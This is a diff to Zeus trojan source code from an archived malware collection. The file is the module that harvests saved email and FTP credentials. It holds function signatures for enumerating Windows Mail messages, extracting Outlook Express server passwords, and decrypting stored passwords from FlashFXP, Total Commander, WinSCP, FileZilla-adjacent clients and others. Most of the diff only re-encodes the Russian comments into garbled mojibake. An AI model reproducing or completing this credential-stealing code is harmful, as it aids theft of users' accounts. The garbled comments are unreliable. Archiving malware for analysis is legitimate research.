@@ -1,3 +1,14 @@
+/*
+  name      Zeus
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     вЂ”
+ */
 #include <windows.h>
 #include <wininet.h>
 #include <shlobj.h>
@@ -40,10 +51,10 @@
 #endif
 
 /*
-  Запись отчета.
+  пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  IN OUT list   - данные для записи, буду освобождены после выхода из функции.
-  IN titleId    - заголовок отчета CryptedStrings::id_*.
+  IN OUT list   - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+  IN titleId    - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ CryptedStrings::id_*.
   IN reportType - BLT_*.
 */
 static void writeReport(LPWSTR list, DWORD titleId, DWORD reportType)
@@ -98,14 +109,14 @@ void SoftwareGrabber::_removeMacromediaFlashFiles(void)
 #if(BO_SOFTWARE_EMAIL > 0)
 
 /*
-  Перечесление всех писем из дирикторий Windows Mail.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ Windows Mail.
   
   IN mimeAllocator    - IMimeAllocator.
   IN store            - IStoreNamespace.
-  IN currentFolder    - текущая директория.
-  IN OUT messageProps - переменная для экономии стека.
-  IN OUT folderProps  - переменная для экономии стека.
-  IN OUT list         - список для email'ов.
+  IN currentFolder    - пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+  IN OUT messageProps - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
+  IN OUT folderProps  - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
+  IN OUT list         - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ email'пїЅпїЅ.
 */
 static void enumWindowsMailMessagesAndFolders(IMimeAllocator *mimeAllocator, IStoreNamespace *store, IStoreFolder *currentFolder, MESSAGEPROPS *messageProps, FOLDERPROPS *folderProps, LPWSTR *list)
 {
@@ -196,31 +207,31 @@ void SoftwareGrabber::_emailWindowsMailRecipients(void)
 //////////////////////////////////////////////////// ////////////////////////////////////////////////
 
 /*
-  Надстройка над IPropertyContainer::GetPropSz() для получения Unicode-строки.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ IPropertyContainer::GetPropSz() пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ Unicode-пїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  IN account - аккаунт.
-  IN id      - ID опции.
+  IN account - пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+  IN id      - ID пїЅпїЅпїЅпїЅпїЅ.
 
-  Return     - строка, или NULL. Нужно освободить через Mem.
+  Return     - пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅ NULL. пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ Mem.
 */
 static LPWSTR outlookExpressSzToUnicode(IImnAccount *account, DWORD id)
 {
-  char buffer[256/*Макс. размер согласно CCHMAX_*.*/];
+  char buffer[256/*пїЅпїЅпїЅпїЅ. пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ CCHMAX_*.*/];
   if(account->GetPropSz(id, buffer, sizeof(buffer)) != S_OK)return NULL;
   return Str::_ansiToUnicodeEx(buffer, -1);
 }
 
 /*
-  Добавление данных сервера в отчет.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ.
 
-  IN title      - заголовок.
-  IN account    - аккаунт.
+  IN title      - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+  IN account    - пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
   IN serverId   - AP_*_SERVER.
   IN portId     - AP_*_PORT.
   IN sslId      - AP_*_SSL.
   IN userNameId - AP_*_USERNAME.
   IN passwordId - AP_*_PASSWORD.
-  OUT buffer    - буфер для данных.
+  OUT buffer    - пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static void appendOutlookExpressInfo(const LPWSTR title, IImnAccount *account, DWORD serverId, DWORD portId, DWORD sslId, DWORD userNameId, DWORD passwordId, LPWSTR *buffer)
 {
@@ -328,13 +339,13 @@ typedef struct
 }WINDOWSMAILDATA;
 
 /*
-  Получение строки из Windows Mail параметра.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ Windows Mail пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  IN root     - рутовый элемент.
-  IN title    - заголовок(префкс) элемента.
-  IN stringId - ID строки формата элемента.
+  IN root     - пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+  IN title    - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ(пїЅпїЅпїЅпїЅпїЅпїЅ) пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+  IN stringId - ID пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  Return      - строка, или NULL в случаи ошибки. Нужно освободить через _freeBstr().
+  Return      - пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅ NULL пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ. пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ _freeBstr().
 */
 static BSTR getWindowsMailString(IXMLDOMElement *root, const LPWSTR title, DWORD stringId)
 {
@@ -347,16 +358,16 @@ static BSTR getWindowsMailString(IXMLDOMElement *root, const LPWSTR title, DWORD
 }
 
 /*
-  Добавление данных сервера в отчет.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ.
 
-  IN title   - заголовок.
-  IN defaultPort - порт по умолчанию.
-  IN salt        - секрет пароля.
-  IN root        - рутовый элемент.
-  OUT buffer     - буфер для данных.
+  IN title   - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+  IN defaultPort - пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+  IN salt        - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
+  IN root        - пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+  OUT buffer     - пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  Return         - true - данные добавлены,
-                   false - данные не найдены.
+  Return         - true - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ,
+                   false - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static bool appendWindowsMailInfo(const LPWSTR title, DWORD defaultPort, const DATA_BLOB *salt, IXMLDOMElement *root, LPWSTR *buffer)
 {
@@ -429,7 +440,7 @@ static bool appendWindowsMailInfo(const LPWSTR title, DWORD defaultPort, const D
 }
 
 /*
-  Обработка XML-файла с аккаунтом Winodws Mail.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ XML-пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ Winodws Mail.
 */
 static bool windowsMailAccountProc(const LPWSTR path, const WIN32_FIND_DATAW *fileInfo, void *data)
 {
@@ -721,7 +732,7 @@ void SoftwareGrabber::_emailWindowsContacts(void)
           
           WDEBUG1(WDDT_INFO, "hr=0x%08X", hr);
 
-          if(hr == S_OK || hr == ERROR_INSUFFICIENT_BUFFER /*Буфер мал.*/ || hr == S_FALSE /*Параметр пустой*/)continue;
+          if(hr == S_OK || hr == ERROR_INSUFFICIENT_BUFFER /*пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ.*/ || hr == S_FALSE /*пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ*/)continue;
 
           break; //Usually ERROR_PATH_NOT_FOUND.
         }
@@ -772,12 +783,12 @@ typedef struct
 //////////////////////////////////////////////////// ////////////////////////////////////////////////
 
 /*
-  Декруптор пароля.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  IN OUT pass    - пароль.
-  IN sectionName - имя секции. Не может быть нулевой.
+  IN OUT pass    - пїЅпїЅпїЅпїЅпїЅпїЅ.
+  IN sectionName - пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ. пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  Return         - размер пароля.
+  Return         - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static int ftpFlashFxp3Decrypt(LPWSTR pass, LPWSTR sectionName)
 {
@@ -929,12 +940,12 @@ void SoftwareGrabber::_ftpFlashFxp3(void)
 //////////////////////////////////////////////////// ////////////////////////////////////////////////
 #if(0)
 /*
-  Декруптор пароля.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  IN OUT pass    - пароль.
-  IN sectionName - имя секции. Не может быть нулевой.
+  IN OUT pass    - пїЅпїЅпїЅпїЅпїЅпїЅ.
+  IN sectionName - пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ. пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  Return         - размер пароля.
+  Return         - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static int ftpCuteFtpDecrypt(LPWSTR pass, LPWSTR sectionName)
 {
@@ -1053,11 +1064,11 @@ static unsigned long randTotalCommander(unsigned long *seed, unsigned long val)
 }  
 
 /*
-  Декруптор пароля.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  IN OUT pass    - пароль.
+  IN OUT pass    - пїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  Return         - размер пароля.
+  Return         - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static int ftpTotalCommanderDecrypt(LPWSTR pass)
 {
@@ -1105,7 +1116,7 @@ bool ftpTotalCommanderProc(const LPWSTR path, const WIN32_FIND_DATAW *fileInfo, 
 /*В В Standard search.
 
 В В IN path - the path.
-В В IN OUT ftpData - search data.  IN recrusive   - рекрусивный поиск.
+В В IN OUT ftpData - search data.  IN recrusive   - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
 */
 static void ftpTotalCommanderBasicSearch(LPWSTR path, FTPDATA *ftpData, bool recrusive)
 {
@@ -1229,11 +1240,11 @@ void SoftwareGrabber::_ftpTotalCommander(void)
 //////////////////////////////////////////////////// ////////////////////////////////////////////////
 
 /*
-  Декруптор пароля.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  IN OUT pass    - пароль.
+  IN OUT pass    - пїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  Return         - размер пароля.
+  Return         - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static int ftpWsFtpDecrypt(LPWSTR pass)
 {
@@ -1246,7 +1257,7 @@ bool ftpWsFtpProc(const LPWSTR path, const WIN32_FIND_DATAW *fileInfo, void *dat
 /*В В Standard search.
 
 В В IN path - the path.
-В В IN OUT ftpData - search data.  IN recrusive   - рекрусивный поиск.
+В В IN OUT ftpData - search data.  IN recrusive   - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
 */
 static void ftpWsFtpBasicSearch(LPWSTR path, FTPDATA *ftpData)
 {
@@ -1457,11 +1468,11 @@ void SoftwareGrabber::_ftpFileZilla(void)
 //////////////////////////////////////////////////// ////////////////////////////////////////////////
 
 /*
-  Декруптор пароля.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  IN OUT pass    - пароль. Буфер должен иметь размер не менее MAX_ITEM_SIZE.
+  IN OUT pass    - пїЅпїЅпїЅпїЅпїЅпїЅ. пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ MAX_ITEM_SIZE.
 
-  Return         - размер пароля.
+  Return         - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static int ftpFarManagerDecrypt(LPWSTR pass)
 {
@@ -1540,12 +1551,12 @@ void SoftwareGrabber::_ftpFarManager(void)
 //////////////////////////////////////////////////// ////////////////////////////////////////////////
 
 /*
-  Декруптор пароля.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  IN OUT pass        - пароль.
-  IN hostAndUserSize - сумма длин пароля и имени.
+  IN OUT pass        - пїЅпїЅпїЅпїЅпїЅпїЅ.
+  IN hostAndUserSize - пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ.
 
-  Return             - размер пароля.
+  Return             - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static int ftpWinScpDecrypt(LPWSTR pass, int hostAndUserSize)
 {
@@ -1664,11 +1675,11 @@ void ftpFtpCommanderMarkStringEnd(LPSTR string)
 }
 
 /*
-  Декруптор пароля.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  IN OUT pass    - пароль.
+  IN OUT pass    - пїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  Return         - размер пароля.
+  Return         - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static int ftpFtpCommanderDecrypt(LPSTR pass)
 {
@@ -1789,11 +1800,11 @@ void SoftwareGrabber::_ftpFtpCommander(void)
 //////////////////////////////////////////////////// ////////////////////////////////////////////////
 
 /*
-  Декруптор пароля.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  IN OUT pass    - пароль.
+  IN OUT pass    - пїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  Return         - размер пароля.
+  Return         - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static int ftpCoreFtpDecrypt(LPWSTR pass)
 {
@@ -1865,11 +1876,11 @@ void SoftwareGrabber::_ftpCoreFtp(void)
 //////////////////////////////////////////////////// ////////////////////////////////////////////////
 
 /*
-  Декруптор пароля.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  IN OUT pass - пароль.
+  IN OUT pass - пїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  Return      - размер пароля.
+  Return      - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static int ftpSmartFtpDecrypt(LPWSTR pass)
 {
